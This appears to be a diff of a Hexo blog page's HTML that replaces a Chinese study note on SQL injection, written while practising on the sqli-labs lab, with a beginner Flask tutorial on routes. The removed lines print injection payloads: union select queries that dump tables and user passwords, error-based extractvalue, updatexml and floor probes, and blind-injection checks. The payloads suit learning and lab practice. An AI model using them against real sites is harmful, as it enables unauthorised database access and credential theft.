@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2025/01/12/sql注入/"/>
+  <link rel="canonical" href="http://example.com/2025/03/16/flask/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,19 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>sql注入 - Hexo</title>
+  <title>Flask - Hexo</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="Hexo - John Doe - Hexo">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql注入">
-<meta property="og:url" content="http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="Flask">
+<meta property="og:url" content="http://example.com/2025/03/16/Flask/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="sql注入笔记前言本笔记用于记录学习SQL注入时的笔记，记录了在sql-labs上使用的各种注入方法。 1.注入点判断SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。 参数类型分类  数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。  如 text.com&#x2F;text.php?id&#x3D;3 对应的sql语句为 select">
+<meta property="og:description" content="Flask学习笔记前言本来在学习计划里面flask应该是要放在和python和requests库一起去学的，但是我优先去学其他漏洞去了，现在回来补以下，后面的漏洞会用到 1.Flask简介Flask是一个轻量级的基于Python的web框架。 简介很短，我看了一下后感觉和php有点像，都是结合html去构建web页面，甚至有些功能都和php相似 2.Hello World在计算机领域，正可谓Hel">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2025-01-12T05:28:35.000Z">
-<meta property="article:modified_time" content="2025-03-15T08:34:49.925Z">
+<meta property="article:published_time" content="2025-03-16T06:41:43.000Z">
+<meta property="article:modified_time" content="2025-03-25T07:06:22.853Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2517,7 +2517,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/12/sql注入/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/16/Flask/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Hexo">
   </span>
@@ -2538,7 +2538,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        sql注入
+        Flask
       </h1>
       <div class='new-meta-box'>
         
@@ -2559,10 +2559,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-01-12T13:28:35+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-03-16T14:41:43+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Jan 12, 2025</p>
+    <p>发布于：Mar 16, 2025</p>
   </a>
 </div>
 
@@ -2585,308 +2585,266 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="sql注入笔记"><a href="#sql注入笔记" class="headerlink" title="sql注入笔记"></a>sql注入笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本笔记用于记录学习SQL注入时的笔记，记录了在sql-labs上使用的各种注入方法。</p>
-<h2 id="1-注入点判断"><a href="#1-注入点判断" class="headerlink" title="1.注入点判断"></a>1.注入点判断</h2><p>SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。</p>
-<p>参数类型分类</p>
-<ol>
-<li>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</li>
-</ol>
-<p>如 text.com&#x2F;text.php?id&#x3D;3 对应的sql语句为 select * from table where id&#x3D;3</p>
-<ol start="2">
-<li>字符型：字符型注入正好相反</li>
-</ol>
-<p>当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹</p>
-<p>例如数字型语句：select * from table where id &#x3D;3</p>
-<p>则字符型如下：select * from table where name&#x3D;’admin’</p>
-<p><strong>可以通过以下方法判断注入类型</strong></p>
-<p>id&#x3D;1 and 2&#x3D;1 –+;数字型<br>id&#x3D;1 ‘ and 2&#x3D;1–+;字符型<br>主要通过是否需要形成闭环判断，数字型不需形成闭环；</p>
-<p>闭环类型则需要不断尝试才可以判断出</p>
-<h2 id="2-数据表字段数判断"><a href="#2-数据表字段数判断" class="headerlink" title="2.数据表字段数判断"></a>2.数据表字段数判断</h2><p>使用order by n 来判断当前表中存在的字段个数，当n大于当前表中实际的字段个数时会引发报错。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4 --+ </span></span><br></pre></td></tr></table></figure>
+    <h1 id="Flask学习笔记"><a href="#Flask学习笔记" class="headerlink" title="Flask学习笔记"></a>Flask学习笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来在学习计划里面flask应该是要放在和python和requests库一起去学的，但是我优先去学其他漏洞去了，现在回来补以下，后面的漏洞会用到</p>
+<h2 id="1-Flask简介"><a href="#1-Flask简介" class="headerlink" title="1.Flask简介"></a>1.Flask简介</h2><p>Flask是一个轻量级的基于Python的web框架。</p>
+<p>简介很短，我看了一下后感觉和php有点像，都是结合html去构建web页面，甚至有些功能都和php相似</p>
+<h2 id="2-Hello-World"><a href="#2-Hello-World" class="headerlink" title="2.Hello World"></a>2.Hello World</h2><p>在计算机领域，正可谓Hello World生万物，一切都起源于神秘的Hello World</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
 
-<p>效果如下：</p>
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/image-20250114172106613.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/image-20250114172106613.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250114172106613">
-
-<h2 id="3-注入手法"><a href="#3-注入手法" class="headerlink" title="3.注入手法"></a>3.注入手法</h2><p>注入手法分类</p>
-<p>1.UNION query SQL injection（联合查询注入）<br>2.Error-based SQL injection（报错注入）<br>3.Boolean-based blind SQL injection（基于布尔的盲注）<br>4.Time-based blind SQL injection（基于时间的盲注）<br>5.Stacked queries SQL injection（堆叠查询SQL注入）</p>
-<p><strong>字符串连接函数介绍</strong></p>
-<ol>
-<li><p>concat(str1,str2,…)——没有分隔符地连接字符串</p>
-</li>
-<li><p>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p>
-</li>
-<li><p>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</p>
-</li>
-</ol>
-<p>说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了。</p>
-<h3 id="1-联合注入-union注入"><a href="#1-联合注入-union注入" class="headerlink" title="1.联合注入(union注入)"></a>1.联合注入(union注入)</h3><p>在网页存在回显时优先使用union注入</p>
-<p>在成功判断注入类型与字段数后即可通过union注入爆数据</p>
-<p>union演示：</p>
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/image-20250114174306351.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/image-20250114174306351.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250114174306351">
-
-<p>我们在限定只能显示一行语句的情况下，通过指定一个无法查询到的数据(如id&#x3D;0)导致无法显示，只能显示union 查询内容</p>
-<p>以下为union注入中较为常用的一些函数和环境变量</p>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>version()</td>
-<td>MySQL 版本</td>
-</tr>
-<tr>
-<td>user()</td>
-<td>当前数据库用户名</td>
-</tr>
-<tr>
-<td>database()</td>
-<td>当前数据库名</td>
-</tr>
-<tr>
-<td>@@version_compile_os</td>
-<td>操作系统版本</td>
-</tr>
-<tr>
-<td>@@datadir</td>
-<td>数据库路径</td>
-</tr>
-</tbody></table>
-<p><strong>爆数据库名</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database() --+</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/d267d9a6d6a89816aa11c8679c957fcd.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/d267d9a6d6a89816aa11c8679c957fcd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="img">
-
-<p><strong>爆数据库表</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#直接套用语句</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/d631827c159d5e6bedf965434857f835.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/d631827c159d5e6bedf965434857f835.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="img">
-
-<p><strong>爆数据库字段</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#只需指定表名即可</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">#或者指定当前数据库名</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/beb0aa22b861bdf409a9b16c665ab244.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/beb0aa22b861bdf409a9b16c665ab244.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="img">
-
-<p><strong>爆数据</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#只需指定表名和字段名</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(`id`,&#x27;</span>:<span class="string">&#x27;,`username`,&#x27;</span>:<span class="string">&#x27;,`password`) from users --+</span></span><br><span class="line"><span class="string">#字段值不加反引号也可以</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(id,<span class="string">&#x27;:&#x27;</span>,username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/0b338d19b6ff377b804a6b860e71d481.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/0b338d19b6ff377b804a6b860e71d481.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="img">
-
-<h3 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h3><p>在联合查询无法使用的情况下，并且存在报错回显的时候优先使用报错注入</p>
-<p>报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p>
-<p><strong>1.extractvalue()函数</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;)) --+</span></span><br><span class="line"><span class="string">不需要了解函数具体作用，只需更改第二个参数即可</span></span><br></pre></td></tr></table></figure>
-
-<p>通过非法字符与查询内容使用concat()连接，导致报错。concat()中查询方式和union注入一样，但通过报错回显内容字节数有限，可以通过**substr()<strong>函数或</strong>limit()**函数控制报错回显内容</p>
-<p><strong>2.updatexml()</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;^&#x27;</span>,(需要查询的内容),<span class="string">&#x27;^&#x27;</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<p>也是通过非法字符连接进行报错，感觉和extractvalue()差不多</p>
-<p><strong>3.floor()</strong></p>
-<p>通过floor()函数进行报错有点难，所以使用的优先级最小</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> 查询的内容 <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br><span class="line">通过<span class="built_in">count</span>(<span class="operator">*</span>)在统计rand()提供的随机数的数量时发生报错</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-盲注"><a href="#3-盲注" class="headerlink" title="3.盲注"></a>3.盲注</h3><h4 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1.布尔盲注"></a>1.布尔盲注</h4><p>布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。</p>
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/774c7c63fe6606e354b382b88a96ac71.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/774c7c63fe6606e354b382b88a96ac71.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="img">
-
-<ol>
-<li>判断数据库类型</li>
-</ol>
+<p>运行结果不重要反正都是Hello World。程序运行后会给我们一个网址<code>127.0.0.1:5000</code>访问即可看到结果</p>
+<p>代码解析：</p>
 <ul>
-<li>MySQL数据库表   information_schema.tables</li>
-<li>access           msysobjects </li>
-<li>SQLServer        sysobjects</li>
+<li><strong>from flask import Flask</strong>： 这行代码从 <code>flask</code> 模块中导入了 <code>Flask</code> 类。<code>Flask</code> 类是 Flask 框架的核心，用于创建 Flask 应用程序实例。</li>
+<li>**app &#x3D; Flask(<strong>name</strong>)**： 这行代码创建了一个 Flask 应用实例。<code>__name__</code> 是一个特殊的 Python 变量，它在模块被直接运行时是 <code>&#39;__main__&#39;</code>，在被其他模块导入时是模块的名字。传递 <code>__name__</code> 给 <code>Flask</code> 构造函数允许 Flask 应用找到和加载配置文件。</li>
+<li>**@app.route(‘&#x2F;‘)**： 这是一个装饰器，用于告诉 Flask 哪个 URL 应该触发下面的函数。在这个例子中，它指定了根 URL（即网站的主页）。</li>
+<li>**def hello_world():**： 这是定义了一个名为 <code>hello_world</code> 的函数，它将被调用当用户访问根URL时。</li>
+<li>**return ‘Hello, World!’**： 这行代码是 <code>hello_world</code> 函数的返回值。当用户访问根 URL 时，这个字符串将被发送回用户的浏览器。</li>
+<li>**if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:**：这行代码是一个条件判断，用于检查这个模块是否被直接运行，而不是被其他模块导入。如果是直接运行，下面的代码块将被执行。</li>
+<li>**app.run(debug&#x3D;True)**：这行代码调用 Flask 应用实例的 <code>run</code> 方法，启动 Flask 内置的开发服务器。<code>debug=True</code> 参数会启动调试模式，这意味着应用会在代码改变时自动重新加载，并且在发生错误时提供一个调试器。</li>
 </ul>
-<p>一般应该都是MySQL数据库吧</p>
-<p>用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Mysql数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from information_schema.tables) --+</span></span><br><span class="line"><span class="string">//判断是否是 access数据库</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Sqlserver数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from sysobjects) --+</span></span><br></pre></td></tr></table></figure>
+<h2 id="3-Flask基本概念"><a href="#3-Flask基本概念" class="headerlink" title="3.Flask基本概念"></a>3.Flask基本概念</h2><p>这里主要是了解一些概念，后面会详细的将用法，现在先了解下整体</p>
+<p>以下是 Flask 的主要基本概念的详细解析：</p>
+<ul>
+<li><strong>路由</strong>：路由是 URL 到 Python 函数的映射。Flask 允许你定义路由，这样当特定的 URL 被访问时，就会调用相应的函数。</li>
+<li><strong>视图函数</strong>：视图函数是处理请求并返回响应的 Python 函数。它们通常接收请求对象作为参数，并返回响应对象。</li>
+<li><strong>请求对象</strong>：请求对象包含了客户端发送的请求信息，如请求方法、URL、请求头、表单数据等。</li>
+<li><strong>响应对象</strong>：响应对象包含了发送给客户端的响应信息，如状态码、响应头、响应体等。</li>
+<li><strong>模板</strong>：Flask 使用 Jinja2 模板引擎来渲染 HTML 模板。模板允许你将 Python 代码嵌入到 HTML 中，从而动态生成网页。</li>
+<li><strong>应用工厂</strong>：应用工厂是一个 Python 函数，它创建并返回一个 Flask 应用实例。这允许你配置和初始化你的应用，并且可以创建多个应用实例。</li>
+<li><strong>配置对象</strong>：Flask 应用有一个配置对象，你可以使用它来设置各种配置选项，如数据库连接字符串、调试模式等。</li>
+<li><strong>蓝图</strong>：蓝图是 Flask 中的一个组织代码的方式，它允许你将相关的视图函数、模板和静态文件组织在一起，并且可以在多个应用中重用。</li>
+<li><strong>静态文件</strong>：静态文件是不会被服务器端执行的文件，如 CSS、JavaScript 和图片文件。Flask 提供了一个简单的方法来服务这些文件。</li>
+<li><strong>扩展</strong>：Flask 有许多扩展，可以添加额外的功能，如数据库集成、表单验证、用户认证等。</li>
+<li><strong>会话</strong>：Flask 使用客户端会话来存储用户信息，这允许你在用户浏览你的应用时记住他们的状态。</li>
+<li><strong>错误处理</strong>：Flask 允许你定义错误处理函数，当特定的错误发生时，这些函数会被调用。</li>
+</ul>
+<h2 id="4-Flask路由"><a href="#4-Flask路由" class="headerlink" title="4.Flask路由"></a>4.Flask路由</h2><p>Flask 路由是 Web 应用程序中将 URL 映射到 Python 函数的机制。</p>
+<p>Flask 路由是 Flask 应用的核心部分，用于处理不同 URL 的请求，并将请求的处理委托给相应的视图函数。</p>
+<p>我们通过Flask访问到的各个网页是有路由设定的</p>
+<p>以下是关于 Flask 路由的详细说明，包括路由的定义、参数、方法和规则等。</p>
+<ol>
+<li><strong>定义路由</strong>：使用 <code>@app.route(&#39;/path&#39;)</code> 装饰器定义 URL 和视图函数的映射。</li>
+<li><strong>路由参数</strong>：通过动态部分在 URL 中传递参数。</li>
+<li><strong>路由规则</strong>：使用类型转换器指定 URL 参数的类型。</li>
+<li><strong>请求方法</strong>：指定允许的 HTTP 请求方法。</li>
+<li><strong>路由函数返回</strong>：视图函数可以返回不同类型的响应。</li>
+<li><strong>静态文件和模板</strong>：管理静态文件和动态渲染 HTML 模板。</li>
+<li><strong>路由优先级</strong>：确保路由顺序正确，以避免意外的匹配结果。</li>
+</ol>
+<p><strong>1.定义路由</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment">#这个app规定模块为自身这个文件</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="comment">#感觉和index.php差不多</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Welcome to the Home Page!&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p>正常显示：</p>
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/a1f36b35a9c0a90584958577735351df.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/a1f36b35a9c0a90584958577735351df.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="img">
+<ul>
+<li><code>@app.route(&#39;/&#39;)</code>：装饰器，用于定义路由。<code>/</code> 表示根 URL。</li>
+<li><code>def home()</code>：视图函数，当访问根 URL 时，返回 <code>&#39;Welcome to the Home Page!&#39;</code>。</li>
+</ul>
+<p><strong>2.路由参数</strong></p>
+<p>路由可以包含动态部分，通过在路由中指定参数，可以将 URL 中的部分数据传递给视图函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/greet/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Hello, <span class="subst">&#123;name&#125;</span>!&#x27;</span></span><br><span class="line"><span class="comment">#f 是用来标识这是一个 f-string（格式化字符串字面值）的</span></span><br></pre></td></tr></table></figure>
 
-<p>报错界面：</p>
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/030192d142e172e5d91773a367c28a54.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/030192d142e172e5d91773a367c28a54.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="img">
+<p>这个代码将&lt;name&gt;作为参数，会输出Hello，&lt;name&gt;</p>
+<p>效果如下</p>
 
-<p>2.判断数据库名</p>
-<p><strong>判断数据库名长度</strong></p>
-<p>通过**length()**函数返回库名长度，与自己提供的数据进行比大小通过是否报错进一步推断出长度</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;5 --+</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>判断库名</strong></p>
-<p>通过**ascii()<strong>函数返回字符的ascii码值，与提供数字进行比较。和</strong>substr()**函数控制字符进行判断。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))&gt;115 --+ </span></span><br></pre></td></tr></table></figure>
+<p>需要注意的是，这虽然和GET请求一样通过url传递参数，但是区别在于这个根据视图函数规定只能传递一个，而且没问号。而GET请求则没有限制随便传，也有问号</p>
+<p><strong>3.路由规划</strong></p>
+<p>路由规则支持不同类型的参数和匹配规则。</p>
+<p>类型规则：</p>
+<ul>
+<li><strong>字符串（默认）：</strong> 匹配任意字符串。</li>
+<li><strong>整数（<code>&lt;int:name&gt;</code>）：</strong> 匹配整数值。</li>
+<li><strong>浮点数（<code>&lt;float:value&gt;</code>）：</strong> 匹配浮点数值。</li>
+<li><strong>路径（<code>&lt;path:name&gt;</code>）：</strong> 匹配任意字符，包括斜杠 <code>/</code>。</li>
+</ul>
+<p>实例;</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;int:user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_profile</span>(<span class="params">user_id</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;User ID: <span class="subst">&#123;user_id&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/files/&lt;path:filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Serving file: <span class="subst">&#123;filename&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p>然后依次判断表名，列名，数据即可。</p>
-<h4 id="3-时间盲注"><a href="#3-时间盲注" class="headerlink" title="3.时间盲注"></a>3.时间盲注</h4><p>在没有回显信息与报错信息也没有布尔类型状态时，我们可以通过时间盲注，推断出数据库的信息。</p>
-<p>时间盲注即和布尔盲注一样通过判断字符推断，只不过将布尔判断改为使用**sleep()<strong>函数，通过加载时间判断语句是否被执行来推断，一般还需结合</strong>if()**函数</p>
